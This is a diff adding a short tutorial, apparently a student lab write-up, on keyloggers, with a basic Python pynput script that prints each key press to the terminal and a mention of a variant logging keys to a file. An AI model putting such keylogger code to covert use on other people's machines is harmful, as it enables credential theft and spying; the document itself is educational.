@@ -1,0 +1,54 @@
+Understanding Keyloggers:
+
+1. What is a Keylogger?
+
+A keylogger is a surveillance tool that records every key pressed on a keyboard, typically without the users knowledge. It's used in both ethical and malicious contexts:
+	* Ethical: Security research, parental monitoring, corporate policy enforcement, software testing / UX studies
+	* Malicious: Credential theft, identity theft, spying
+
+
+2. How does it work?
+
+Keyloggers hook into the operating system's keyboard event queue and listens for keypress events. They typically store and send the keypress data.
+
+3. Is a Keylogger a virus?
+
+Keyloggers are a tool, like Nmap or Wireshark. But if it is used without permission, secretly sent over the network, or built into software without disclosure it can be considered a virus.
+
+Installing Dependencies:
+
+'python -m pip install pynput'
+
+Create keylogger.py Script:
+
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        print(f"Key {key} pressed".format(key.char))
+    except AttributeError:
+        print(f"Key {key} pressed".format(key))
+
+def on_release(key):
+    print(f"Key {key} released".format(key))
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+    
+# Collects events until released
+with keyboard.Listener(
+    on_press=on_press,
+    on_release=on_release
+) as listener:
+    listener.join()
+
+	* Run script using 'py keylogger.py'
+
+(See keylog-terminal.png for logs of this script)
+
+
+Logging Keypresses into a file:
+
+The keylogger.py was editing to append a file (log.txt) and save every pressed key into the text file.
+
+(See keylog-formatted.png to see the terminal & see log.txt for the formatted version & keylogger.py for the full code)
